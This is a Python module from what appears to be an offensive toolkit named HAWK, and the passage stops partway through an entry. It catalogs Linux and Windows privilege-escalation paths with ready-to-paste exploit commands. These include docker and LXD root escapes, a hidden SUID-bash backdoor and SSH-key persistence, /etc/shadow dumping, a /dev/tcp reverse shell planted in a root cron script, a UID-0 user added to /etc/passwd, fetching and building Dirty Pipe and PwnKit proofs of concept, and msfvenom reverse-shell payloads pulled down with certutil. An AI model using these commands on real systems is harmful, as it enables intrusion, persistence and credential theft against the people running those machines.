# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — Curated privilege-escalation pattern library.

Why this module exists
──────────────────────
Once HAWK has landed a shell and the post-RCE recon analyzer has
pushed findings to Target Intel (hidden group memberships, sudo
rules, SUID, capabilities, writable critical bins, sockets, kernel
version, etc.), the operator wants ONE more synthesis step:

    "given everything HAWK already knows about this box, which
     privesc paths are PROBABLY going to work?"

That's what this module provides: a curated catalog of well-known
linux/windows privesc paths, each with:

  • a list of matchers (substring matches against finding titles
    and descriptions on Target Intel) — if any matcher hits, the
    path is considered viable
  • a severity (critical/high/medium/low) used for ranking
  • a one-paragraph summary aimed at the operator
  • a sequence of concrete exploit commands ready to copy-paste
    (with substitutable placeholders {target}, {user}, …)
  • references (gtfobins, hacktricks, exploit-db, CVE numbers)

Design — "in crescendo, in divenire"
────────────────────────────────────
Lorenzo's directive: this module must grow over time.  Adding a new
privesc path = appending one entry to ``PATTERNS``.  No parser
changes, no schema migrations.  The match logic is intentionally
dumb (substring/regex on finding titles+descriptions) so new
patterns just plug in.

Target-agnostic
───────────────
Patterns work whether the shell came from an HTB CTF, an internal
AD member box, or an external public-facing target.  We do NOT
assume `/etc/hosts` is writable, we do NOT assume internet access
from the box, we do NOT assume any specific distro.  Where a
pattern is distro-specific (e.g. dirty pipe kernel range), the
matcher is on kernel version range, not on `os-release`.

Public API
──────────
``match(findings, *, kernel="", user="", host="")`` — run all
patterns against a list of finding dicts (the format used by
``utils.post_rce_recon.analyze_output`` and
``target_intel.auto_findings``).  Returns a list of *match dicts*
sorted by severity (critical first), each containing the original
pattern + a ``why`` field explaining which finding triggered it.

``render(match_dict)`` — return a (title_str, body_str) tuple ready
to drop into a dialog, with placeholders substituted.

This module is GUI-free and has no third-party deps.
"""

from __future__ import annotations
import re
from typing import Any


# ─── Severity ordering ────────────────────────────────────────────
_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


# ─── Pattern catalog ──────────────────────────────────────────────
# Each entry:
#   id:           short stable identifier (used for de-dup)
#   name:         human title shown in the dialog
#   severity:     critical / high / medium / low
#   platform:     "linux" or "windows"
#   matchers:     list of dicts; each dict can have:
#                   - title_substr   : list of case-insensitive substrings
#                                      to match against finding titles
#                   - desc_substr    : list of case-insensitive substrings
#                                      to match against finding descriptions
#                   - kernel_lt      : tuple (a, b, c) — match if kernel
#                                      version < this tuple
#                   - kernel_ge      : tuple — match if kernel >= this tuple
#                   - any_finding    : if true, ALWAYS match (for kernel-only
#                                      patterns where we don't have a
#                                      finding to anchor to)
#                 within ONE matcher dict, ALL keys must hit (AND).
#                 ANY matcher dict matching = pattern fires (OR across
#                 the matchers list).
#   summary:      one-paragraph description for the operator
#   exploit:      list of strings — copy-pasteable commands.  Use
#                 placeholders {user}, {host}, {target_ip} that
#                 ``render()`` will substitute.
#   refs:         list of URLs / CVE ids
#
# Adding a new pattern = append to this list.

PATTERNS: list[dict[str, Any]] = [

    # ── DOCKER GROUP / SOCKET ─────────────────────────────────────
    {
        "id": "docker_group",
        "name": "Docker group → root via container mount",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            {"title_substr": [
                "hidden group membership (docker)",
                "privileged group (docker) visible",
                "docker socket present",
            ]},
            {"desc_substr": ["/var/run/docker.sock"]},
        ],
        "summary": (
            "Docker daemon runs as root.  Anyone able to talk to "
            "/var/run/docker.sock (members of the `docker` group, "
            "or anyone with rw on the socket) can mount the host "
            "filesystem inside a container — that container runs "
            "as root, so any host file is readable / writable.  "
            "Equivalent to root.\n\n"
            "Three real-world traps that bite this technique on "
            "any target type (CTF / internal / external):\n"
            "  1. The image's USER directive overrides root by "
            "default — `--user 0:0` is MANDATORY or commands run "
            "as `nobody` and host files are permission-denied.\n"
            "  2. `docker pull` requires outbound internet, which "
            "many engagements don't have (HTB, isolated DMZ, air-"
            "gapped enterprise).  Use a locally-pulled image — "
            "any image with a basic shell works (mysql, nginx, "
            "alpine, the app's own image, …).\n"
            "  3. Reverse shells are rarely TTY: drop `-it` or use "
            "`-i` only.  `-it` against a non-TTY shell errors "
            "with `the input device is not a TTY`.\n\n"
            "Below: 2 prep steps, then pick ONE of three paths "
            "(A / B / C) depending on what you actually need."
        ),
        "exploit": [
            "# ─────── PREP (run both first) ───────────────────────────",
            "",
            "# 1. Activate the docker group (mandatory if `id` didn't show it — the",
            "#    'id lies' trap on non-login shells; sg loads NSS supplementary groups):",
            "sg docker -c 'id'",
            "",
            "# 2. List locally-pulled images.  Pick one with any shell — substitute its",
            "#    REPO:TAG for IMG_NAME everywhere below (HAWK auto-substitutes the",
            "#    first one detected by post-rce-recon).  All three paths use the SAME",
            "#    container shape: --rm (cleanup) --user 0:0 (force root) -v /:/hostfs",
            "#    (mount whole host fs read+write).",
            "sg docker -c 'docker image ls'",
            "",
            "# ─────── [A] READ A SINGLE FILE AS ROOT ───────────────────",
            "# Lowest noise: spawns a one-shot container that runs cat, dies, --rm",
            "# cleans up.  No shell on the host, no file written, no persistence.",
            "# Use for: read /etc/shadow, /root/.ssh/id_rsa, app config files, CTF flags,",
            "#         private keys, any file the host root can read.",
            "# Replace /path/to/file with what you actually need:",
            "#   • CTF / HTB lab        →  /root/root.txt",
            "#   • Internal pentest     →  /etc/shadow  or  /root/.ssh/authorized_keys",
            "#   • External pentest     →  /etc/shadow  + look at app config dirs",
            "sg docker -c 'docker run --rm --user 0:0 --entrypoint cat -v /:/hostfs IMG_NAME /hostfs/path/to/file'",
            "",
            "# ─────── [B] PLANT PERSISTENT ROOT BACKDOOR ──────────────",
            "# Drop a SUID-bash on the host so you can re-elevate from your normal user",
            "# shell anytime — even after the docker exploit window closes.  This does",
            "# NOT read any file: it's pure persistence.  Forensic note: leaves /tmp/.r",
            "# on disk (auditd/ETW/EDR may flag chmod +s on a shell binary; consider",
            "# path B' below for a stealthier variant).",
            "sg docker -c 'docker run --rm --user 0:0 --entrypoint sh -v /:/hostfs IMG_NAME -c \"cp /hostfs/bin/bash /hostfs/tmp/.r; chmod +s /hostfs/tmp/.r\"'",
            "# Then, from your normal shell, get a persistent root shell:",
            "/tmp/.r -p   # -p is MANDATORY: bash drops EUID without it, even with SUID bit",
            "",
            "# [B'] STEALTHIER PERSISTENCE — drop SSH key into root's authorized_keys:",
            "#      no SUID file (no AV signature), survives reboot, login over SSH",
            "#      gives you a clean root shell.  Replace YOUR_PUBKEY with the contents",
            "#      of ~/.ssh/id_rsa.pub on Kali.  Skip if SSH is firewalled.",
            "sg docker -c 'docker run --rm --user 0:0 --entrypoint sh -v /:/hostfs IMG_NAME -c \"mkdir -p /hostfs/root/.ssh; echo YOUR_PUBKEY >> /hostfs/root/.ssh/authorized_keys; chmod 600 /hostfs/root/.ssh/authorized_keys\"'",
            "# Then on Kali:",
            "ssh -i ~/.ssh/id_rsa root@TARGET_IP",
            "",
            "# ─────── [C] RUN ARBITRARY COMMAND AS ROOT (NO PERSISTENCE) ─",
            "# Lowest forensic footprint per command.  Container is created, runs your",
            "# command via chroot, dies.  Nothing left on disk.  Repeat with different",
            "# YOUR_CMD as needed (each invocation = one container event in the audit",
            "# log, so chain commands with &&/; in YOUR_CMD when you want one event).",
            "sg docker -c 'docker run --rm --user 0:0 -v /:/hostfs IMG_NAME chroot /hostfs sh -c \"YOUR_CMD\"'",
            "",
            "# Examples — same wrapper, different YOUR_CMD:",
            "#   • dump /etc/shadow:        cat /etc/shadow",
            "#   • list root's home:        ls -la /root",
            "#   • read app DB config:      cat /var/www/html/wp-config.php",
            "#   • check sudo entries:      cat /etc/sudoers; ls /etc/sudoers.d/",
            "#   • dump browser saved pwds: find /home -name 'Login Data' 2>/dev/null",
            "#   • full root shell (if you have a stable PTY — rare in reverse shells):",
            "#     replace `--rm --user 0:0` with `--rm -i --user 0:0`, drop chroot's",
            "#     -c, and pipe stdin from your terminal.",
        ],
        "refs": [
            "https://gtfobins.github.io/gtfobins/docker/",
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "docker-security/index.html",
        ],
    },

    # ── LXD / LXC GROUP ───────────────────────────────────────────
    {
        "id": "lxd_group",
        "name": "LXD/LXC group → root via privileged container",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            {"title_substr": [
                "hidden group membership (lxd)",
                "hidden group membership (lxc)",
                "privileged group (lxd) visible",
                "privileged group (lxc) visible",
            ]},
        ],
        "summary": (
            "Members of `lxd`/`lxc` can launch a PRIVILEGED container "
            "with the whole host filesystem mounted inside it at "
            "/mnt/root.  Inside that container you are root, so every "
            "host file is read/write -> equivalent to root on the host.  "
            "Any image works (usually a tiny alpine)."
        ),
        "exploit": [
            "# Bootstrap lxd if first time (skip if `lxc list` already works):",
            "lxd init --auto",
            "",
            "# Pull a small image:",
            "lxc image import https://images.linuxcontainers.org/images/alpine/edge/amd64/default/$(date +%Y%m%d)_13:00/rootfs.squashfs --alias alpine 2>/dev/null \\",
            "  || lxc image copy images:alpine/edge/amd64 local: --alias alpine",
            "",
            "# Launch privileged container with host / mounted at /mnt/root:",
            "lxc init alpine pwn -c security.privileged=true",
            "lxc config device add pwn host disk source=/ path=/mnt/root recursive=true",
            "lxc start pwn",
            "lxc exec pwn -- /bin/sh",
            "# Inside the container:  cat /mnt/root/root/root.txt",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "interesting-groups-linux-pe/lxd-privilege-escalation.html",
        ],
    },

    # ── DISK GROUP ────────────────────────────────────────────────
    {
        "id": "disk_group",
        "name": "Disk group → raw block-device read/write",
        "severity": "high",
        "platform": "linux",
        "matchers": [
            {"title_substr": [
                "hidden group membership (disk)",
                "privileged group (disk) visible",
            ]},
        ],
        "summary": (
            "Members of `disk` can read and write raw block devices "
            "(/dev/sda...).  With debugfs you read the rootfs directly "
            "-- bypassing POSIX permissions -- to pull /etc/shadow or "
            "root's SSH keys, or write a key into root's "
            "authorized_keys for a root login."
        ),
        "exploit": [
            "# Identify the rootfs block device:",
            "df / | tail -1 | awk '{print $1}'",
            "",
            "# Read /etc/shadow via debugfs (replace /dev/sda1 with rootfs):",
            "debugfs -R 'cat /etc/shadow' /dev/sda1",
            "",
            "# Or dump root's authorized_keys:",
            "debugfs -R 'cat /root/.ssh/authorized_keys' /dev/sda1",
            "",
            "# Write back (planting an SSH key — DESTRUCTIVE, do with care):",
            "debugfs -w -R 'write /tmp/myauthorized_keys /root/.ssh/authorized_keys' /dev/sda1",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "interesting-groups-linux-pe/index.html",
        ],
    },

    # ── SHADOW GROUP ──────────────────────────────────────────────
    {
        "id": "shadow_group",
        "name": "Shadow group → read /etc/shadow → john",
        "severity": "high",
        "platform": "linux",
        "matchers": [
            {"title_substr": [
                "hidden group membership (shadow)",
                "privileged group (shadow) visible",
            ]},
        ],
        "summary": (
            "Members of `shadow` can read /etc/shadow.  Dump it, crack "
            "the hashes offline with john + rockyou -- if root or any "
            "sudoer has a weak password, that password is your way in "
            "(su / sudo -> root)."
        ),
        "exploit": [
            "cat /etc/shadow > /tmp/.s",
            "cat /etc/passwd > /tmp/.p",
            "# Exfiltrate /tmp/.s + /tmp/.p back to Kali, then:",
            "unshadow /tmp/.p /tmp/.s > /tmp/.unshadow",
            "john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/.unshadow",
            "# (HAWK's SHADOW CRACK card automates this end-to-end)",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "interesting-groups-linux-pe/index.html",
        ],
    },

    # ── SUDO NOPASSWD ─────────────────────────────────────────────
    {
        "id": "sudo_nopasswd",
        "name": "sudo NOPASSWD — check binary on gtfobins",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            {"title_substr": ["sudo nopasswd"]},
            {"desc_substr": ["nopasswd:", "(all : all) nopasswd"]},
        ],
        "summary": (
            "`sudo -l` showed at least one NOPASSWD entry -- you can "
            "run that binary as root without a password.  Almost any "
            "binary is a root shell if you know its gtfobins trick "
            "(find, vim, less, tar, awk, env, tee, dd, systemctl, ...): "
            "look yours up and run the SUDO variant of the escape."
        ),
        "exploit": [
            "# Re-run sudo -l to copy the exact rule:",
            "sudo -l",
            "",
            "# Then look up the binary on gtfobins:",
            "# https://gtfobins.github.io/#sudo",
            "",
            "# Examples (substitute the actual binary):",
            "sudo find . -exec /bin/sh -p \\; -quit",
            "sudo vim -c ':!/bin/sh'",
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "sudo env /bin/sh",
            "sudo less /etc/profile   # then press v then :!sh",
        ],
        "refs": [
            "https://gtfobins.github.io/#sudo",
        ],
    },

    # ── EXPLOITABLE SUID ──────────────────────────────────────────
    {
        "id": "suid_gtfobins",
        "name": "Exploitable SUID binary — gtfobins",
        "severity": "high",
        "platform": "linux",
        "matchers": [
            {"title_substr": [
                "exploitable suid binaries",
                "world-writable critical binary",
            ]},
        ],
        "summary": (
            "Found SUID-root binaries listed on gtfobins that turn "
            "into a root shell with one well-known invocation.  "
            "Pick the binary HAWK flagged and run the matching "
            "GTFOBins recipe."
        ),
        "exploit": [
            "# Use the recipe for the SPECIFIC binary HAWK flagged in the",
            "# finding above — each gtfobins SUID has its OWN escape:",
            "",
            "# nmap (old, e.g. Metasploitable 4.53) — interactive mode:",
            "nmap --interactive",
            "nmap> !sh                       # -> root shell",
            "# nmap (newer) — via an NSE script:",
            "TF=$(mktemp); echo 'os.execute(\"/bin/sh -p\")' > $TF; nmap --script=$TF",
            "",
            "find . -exec /bin/sh -p \\; -quit",
            "vim -c ':!/bin/sh -p' -E",
            "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            "perl -e 'exec \"/bin/sh -p\";'",
            "python -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
            "ruby -e 'exec \"/bin/sh -p\"'",
            "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "env /bin/sh -p",
            "less /etc/profile               # then at the pager: !/bin/sh -p",
            "cp /bin/sh /tmp/.x && chmod +s /tmp/.x      # only via SUID cp",
            "",
            "# IMPORTANT: pass -p to /bin/sh — bash drops privs when EUID != UID",
            "# unless -p is set.  Without -p the SUID shell silently de-elevates.",
            "# Recipe for another binary?  gtfobins.github.io/gtfobins/<name>/#suid",
        ],
        "refs": [
            "https://gtfobins.github.io/#+suid",
        ],
    },

    # ── CAPABILITIES ──────────────────────────────────────────────
    {
        "id": "caps_setuid",
        "name": "cap_setuid → root via Python/Perl/...",
        "severity": "high",
        "platform": "linux",
        "matchers": [
            {"desc_substr": [
                "cap_setuid",
                "cap_dac_read_search",
                "cap_dac_override",
                "cap_sys_admin",
                "cap_chown",
            ]},
            {"title_substr": ["dangerous capabilit"]},
        ],
        "summary": (
            "A binary carries a dangerous Linux capability.  "
            "cap_setuid+ep = become any UID (incl. 0) -> python/perl/"
            "ruby with it are a direct root shell.  cap_dac_read_search "
            "= read any file regardless of permissions (e.g. "
            "/etc/shadow).  Use the recipe for the capability HAWK flagged."
        ),
        "exploit": [
            "# Re-run getcap to confirm the binary:",
            "getcap -r / 2>/dev/null",
            "",
            "# cap_setuid+ep on python:",
            "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "",
            "# cap_setuid+ep on perl:",
            "perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/sh\"'",
            "",
            "# cap_dac_read_search → read /etc/shadow:",
            "/path/to/binary --read /etc/shadow   # depends on the binary",
            "",
            "# cap_sys_admin = mount/unshare/...; usually combined with",
            "# cgroup-release-agent escapes when on a container.",
        ],
        "refs": [
            "https://gtfobins.github.io/#+capabilities",
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "linux-capabilities.html",
        ],
    },

    # ── DIRTY PIPE (kernel < 5.16.11 / 5.15.25 / 5.10.102) ────────
    {
        "id": "kernel_dirty_pipe",
        "name": "Dirty Pipe (CVE-2022-0847) — kernel <5.16.11",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            # Vulnerable: 5.8 <= kernel < 5.10.102 (LTS), 5.15 < 5.15.25,
            # < 5.16.11.  We approximate by "< 5.16.11" — false positives
            # on 5.10/5.15 LTS that may already be patched are acceptable
            # because the operator cross-checks before running.
            {"kernel_lt": (5, 16, 11), "kernel_ge": (5, 8, 0)},
        ],
        "summary": (
            "Kernel 5.8 through 5.16.11 (or an unpatched 5.10/5.15 "
            "LTS) is vulnerable to CVE-2022-0847 (Dirty Pipe): an "
            "unprivileged user can overwrite bytes in files they can "
            "only read.  Aim the PoC at a root-owned SUID binary and "
            "it drops you a root shell.  Build on Kali, copy to the "
            "target, run it there."
        ),
        "exploit": [
            "# 1. Confirm the running kernel is in range (5.8 up to <5.16.11):",
            "uname -r",
            "",
            "# 2. Fetch + build the PoC ON KALI, then copy /tmp/dp onto the target.",
            "#    Reference PoC: https://haxx.in/files/dirtypipez.c",
            "wget https://haxx.in/files/dirtypipez.c -O /tmp/dp.c",
            "gcc /tmp/dp.c -o /tmp/dp",
            "",
            "# 3. Point it at a root-owned SUID binary -> spawns a root shell.",
            "#    DESTRUCTIVE: it rewrites bytes in the SUID binary (the PoC restores",
            "#    them, but back /usr/bin/sudo up first in case it aborts mid-run).",
            "/tmp/dp /usr/bin/sudo   # hijacks the SUID binary",
            "",
            "# verify:  id",
        ],
        "refs": [
            "https://dirtypipe.cm4all.com/",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-0847",
        ],
    },

    # ── PWNKIT (polkit < 0.119) ───────────────────────────────────
    {
        "id": "kernel_pwnkit",
        "name": "PwnKit (CVE-2021-4034) — pkexec on most Linux <2022",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            # post_rce_recon emits a dedicated "pkexec present …
            # PwnKit candidate" finding whenever /usr/bin/pkexec is
            # in the SUID list — that's our anchor.  Polkit version
            # check is left to the operator (running `pkexec
            # --version` is too noisy to bake into the snippet).
            {"title_substr": ["pkexec present", "pwnkit"]},
        ],
        "summary": (
            "If /usr/bin/pkexec exists and polkit is older than 0.120 "
            "(most boxes before 2022), CVE-2021-4034 (PwnKit) turns "
            "pkexec into an instant root shell.  A userland argv/heap "
            "exploit with no kernel involvement, so it's extremely "
            "reliable.  Build it, run it, land as root."
        ),
        "exploit": [
            "# 1. Confirm pkexec is present and SUID-root (the exploit needs the setuid bit):",
            "ls -l /usr/bin/pkexec     # should be SUID (rws)",
            "",
            "# 2. Fetch + build the PoC (reference: https://github.com/ly4k/PwnKit):",
            "wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O /tmp/pk.c",
            "gcc /tmp/pk.c -o /tmp/pk",
            "",
            "# 3. Run it -> drops you straight into a root shell:",
            "/tmp/pk",
            "",
            "# verify:  id",
        ],
        "refs": [
            "https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/"
            "pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkit-pkexec",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
        ],
    },

    # ── BARON SAMEDIT (sudo < 1.9.5p2) ────────────────────────────
    {
        "id": "kernel_baron_samedit",
        "name": "Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            # Detected only if recon picked up sudo version somewhere;
            # otherwise, it's a "test it" recommendation.
            {"desc_substr": ["sudo 1.8", "sudo 1.9.5", "sudo 1.9.4",
                              "sudo 1.9.3", "sudo 1.9.2", "sudo 1.9.1",
                              "sudo 1.9.0"]},
        ],
        "summary": (
            "sudo older than 1.9.5p2 has a heap buffer overflow in "
            "sudoedit (CVE-2021-3156, Baron Samedit).  Any local user "
            "can trigger it to get root -- no sudo rule and no password "
            "needed.  The offsets are distro/glibc-specific, so build "
            "the PoC on a matching host and push the binary over."
        ),
        "exploit": [
            "# 1. Confirm the sudo version is < 1.9.5p2:",
            "sudo --version | head -1",
            "",
            "# 2. Build the PoC on a host matching the target's distro & glibc",
            "#    (the offsets are version-specific), then push the binary to the",
            "#    target and run it there -> root shell (verify with:  id).",
            "#    Reference PoC: https://github.com/blasty/CVE-2021-3156",
        ],
        "refs": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-3156",
            "https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/"
            "cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit",
        ],
    },

    # ── CRON ROOT TASK ────────────────────────────────────────────
    {
        "id": "cron_writable",
        "name": "Cron job runs writable script as root",
        "severity": "high",
        "platform": "linux",
        "matchers": [
            {"title_substr": ["writable cron", "root cron"]},
            {"desc_substr": ["* * * * * root", "/etc/cron.d/", "/etc/cron.hourly/"]},
        ],
        "summary": (
            "A cron job runs as root but executes a script (or a path) "
            "you can write to.  Append a reverse-shell one-liner to that "
            "script; on the next tick root runs it and connects back to "
            "your listener -> root shell."
        ),
        "exploit": [
            "# 1. Find the root cron and the script/path it runs (look for a",
            "#    '* * * * * root ...' line pointing at a writable script):",
            "cat /etc/crontab; ls -la /etc/cron.*",
            "",
            "# 2. On Kali (your box) start a listener to catch the callback:",
            "#      nc -lvnp 4444",
            "",
            "# 3. Append a reverse shell to the writable script (root runs it next tick):",
            "echo 'bash -c \"bash -i >& /dev/tcp/{target_ip}/4444 0>&1\"' >> /path/to/script.sh",
            "",
            "# verify: wait one tick -> your Kali listener drops a root shell (type  id)",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "index.html#scheduled-cron-jobs",
        ],
    },

    # ── WRITABLE /etc/passwd ──────────────────────────────────────
    {
        "id": "writable_passwd",
        "name": "Writable /etc/passwd → add root user",
        "severity": "critical",
        "platform": "linux",
        "matchers": [
            # Require the finding to actually indicate WRITABILITY, not
            # merely mention /etc/passwd — an LFI / readable-file finding
            # names it too, which used to fire a bogus CRITICAL here.
            {"desc_all": ["/etc/passwd", "writable"]},
            {"title_substr": ["writable /etc/passwd",
                              "/etc/passwd is world-writable"]},
        ],
        "summary": (
            "/etc/passwd is world-writable.  Add your own UID-0 "
            "(root-equivalent) user with a password hash you control, "
            "then `su` to it -> root shell.  Works with no /etc/shadow "
            "access: a non-empty hash in the second field of "
            "/etc/passwd is still honored, overriding /etc/shadow."
        ),
        "exploit": [
            "# 1. Make an MD5crypt hash for a password you pick (here: pwn):",
            "openssl passwd -1 -salt xx pwn   # -> $1$xx$HASH  (paste the HASH below)",
            "#    NOTE: plain 'openssl passwd pwn' gives a DES hash, NOT the $1$ the",
            "#    line below expects — the -1 (MD5) is required.",
            "",
            "# 2. Append a UID-0 user (replace YOURHASH with the hash from step 1).",
            "#    DESTRUCTIVE: back /etc/passwd up first ->  cp /etc/passwd /tmp/passwd.bak",
            "echo 'pwn:$1$xx$YOURHASH:0:0:root:/root:/bin/bash' >> /etc/passwd",
            "",
            "# 3. Switch to the new user (password: pwn) -> root shell:",
            "su pwn",
            "id   # verify: uid=0(root)",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
            "index.html#writable-etcpasswd",
        ],
    },

    # ── WINDOWS — SeImpersonate ───────────────────────────────────
    {
        "id": "win_se_impersonate",
        "name": "SeImpersonate / SeAssignPrimaryToken → SYSTEM via Potato",
        "severity": "critical",
        "platform": "windows",
        "matchers": [
            {"desc_substr": [
                "seimpersonateprivilege",
                "seassignprimarytokenprivilege",
            ]},
            {"title_substr": ["seimpersonateprivilege",
                              "seassignprimarytokenprivilege"]},
        ],
        "summary": (
            "Your token holds SeImpersonate or SeAssignPrimaryToken "
            "-- the privilege Windows service accounts (IIS, MSSQL, "
            "...) carry.  Hand it to any Potato-family tool and you "
            "trade it for a full SYSTEM shell.  Pick the variant for "
            "the build: GodPotato (Win 8 -> Server 2022), PrintSpoofer "
            "(Win 10 / Server 2019), JuicyPotato (pre-2019), "
            "RoguePotato (when a remote COM port is reachable)."
        ),
        "exploit": [  # cmd.exe-style (legacy reverse shells)
            ":: Confirm SeImpersonate / SeAssignPrimaryToken Enabled:",
            "whoami /priv",
            "",
            ":: GodPotato (Windows 8 → Server 2022, .NET 3.5+):",
            "GodPotato.exe -cmd \"cmd /c whoami\"",
            "",
            ":: PrintSpoofer (Windows 10 / 2019):",
            "PrintSpoofer.exe -i -c cmd",
            "",
            ":: (use HAWK's POTATO picker card to pull the right binary)",
        ],
        "exploit_ps": [  # PowerShell-native equivalent
            "# Confirm SeImpersonate / SeAssignPrimaryToken Enabled:",
            "whoami /priv | Select-String 'SeImpersonate','SeAssignPrimaryToken'",
            "",
            "# Fetch GodPotato from your Kali HTTP server to %TEMP% (.NET 4+ on target),",
            "# then run it -- the -cmd payload executes as SYSTEM:",
            "$wc = New-Object Net.WebClient",
            "$wc.DownloadFile('http://{target_ip}:8000/GodPotato.exe', \"$env:TEMP\\gp.exe\")",
            "& \"$env:TEMP\\gp.exe\" -cmd \"powershell -ep bypass -c whoami\"   # -> nt authority\\system",
            "",
            "# PrintSpoofer is a NATIVE exe (not a .NET assembly) -- fetch and run it,",
            "# don't try to reflectively load it:",
            "$wc.DownloadFile('http://{target_ip}:8000/PrintSpoofer.exe', \"$env:TEMP\\ps.exe\")",
            "& \"$env:TEMP\\ps.exe\" -i -c powershell",
            "",
            "# Or use HAWK's POTATO picker — it grabs the right exe based on OS fingerprint.",
        ],
        "refs": [
            "https://github.com/BeichenDream/GodPotato",
            "https://github.com/itm4n/PrintSpoofer",
        ],
    },

    # ── WINDOWS — AlwaysInstallElevated ───────────────────────────
    {
        "id": "win_aie",
        "name": "AlwaysInstallElevated → SYSTEM via .msi",
        "severity": "critical",
        "platform": "windows",
        "matchers": [
            {"desc_substr": ["alwaysinstallelevated"]},
            {"title_substr": ["alwaysinstallelevated"]},
        ],
        "summary": (
            "Both the HKLM and HKCU AlwaysInstallElevated keys are 1, "
            "so Windows installs any .msi with SYSTEM rights no matter "
            "who launches it.  Build a payload .msi, run it with "
            "msiexec, and it fires as SYSTEM -- no exploit binary "
            "needed.  BOTH keys must be 1; one alone does nothing."
        ),
        "exploit": [
            ":: Confirm both keys are 0x1:",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "",
            ":: Generate evil.msi on Kali:",
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST={target_ip} LPORT=4444 -f msi -o evil.msi",
            "",
            ":: On target — quiet install runs as SYSTEM:",
            "msiexec /quiet /qn /i \\\\YOUR_SMB\\share\\evil.msi",
            ":: Or download to disk first if SMB push isn't available:",
            "certutil -urlcache -split -f http://{target_ip}:8000/evil.msi C:\\Windows\\Temp\\evil.msi",
            "msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi",
        ],
        "exploit_ps": [
            "# Confirm both keys are 0x1 (PS-native registry access):",
            "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -EA SilentlyContinue",
            "Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -EA SilentlyContinue",
            "",
            "# Generate evil.msi on Kali:",
            "# msfvenom -p windows/x64/shell_reverse_tcp LHOST={target_ip} LPORT=4444 -f msi -o evil.msi",
            "",
            "# Pull from your kali HTTP server, then quiet-install as SYSTEM:",
            "Invoke-WebRequest 'http://{target_ip}:8000/evil.msi' -OutFile \"$env:TEMP\\e.msi\" -UseBasicParsing",
            "Start-Process msiexec -ArgumentList '/quiet','/qn','/i',\"$env:TEMP\\e.msi\" -Wait",
        ],
        "refs": [
            "https://book.hacktricks.wiki/en/windows-hardening/windows-local-"
            "privilege-escalation/index.html#alwaysinstallelevated",
        ],
    },

    # ── WINDOWS — Unquoted service path ───────────────────────────
    {
        "id": "win_unquoted_service",
        "name": "Unquoted service path → binary planting",
        "severity": "high",
        "platform": "windows",
        "matchers": [
            {"title_substr": ["unquoted service path",
                              "unquoted service binary",
                              "unquoted service paths"]},
        ],
        "summary": (
            "A service's ImagePath is unquoted and contains a space "
            "(e.g. C:\\Program Files\\Vendor\\Tool\\bin.exe).  Windows "
            "tries each space-delimited prefix as an executable before "
            "falling through, so if you can write to an earlier path "
            "component you plant your own binary there.  On the next "
            "start (sc start / reboot) Windows runs it as the service "
            "account -- usually LocalSystem."
        ),
        "exploit": [
            ":: Confirm the unquoted paths (modern, no wmic dependency):",
            "sc.exe query state= all | findstr SERVICE_NAME",
            "for /f \"tokens=2\" %i in ('sc query state= all ^| findstr SERVICE_NAME') do @sc qc \"%i\" | findstr BINARY_PATH_NAME",
            "",
            ":: Check writability of each parent folder (substitute the path):",
            "icacls \"C:\\Program Files\\Vendor\"",
            ":: Look for (M), (W) or (F) on your user / BUILTIN\\Users / Authenticated Users.",
            "",
            ":: Drop payload at the planting position (between space and \\):",
            "copy evil.exe \"C:\\Program Files\\Vendor.exe\"",
            "sc start <service-name>",
            "",
            ":: Build evil.exe on Kali:",
            ":: msfvenom -p windows/x64/shell_reverse_tcp LHOST={target_ip} LPORT=4444 -f exe -o evil.exe",
        ],
        "exploit_ps": [
            "# Confirm vulnerable services (no wmic dependency, works on Win11/2022+):",
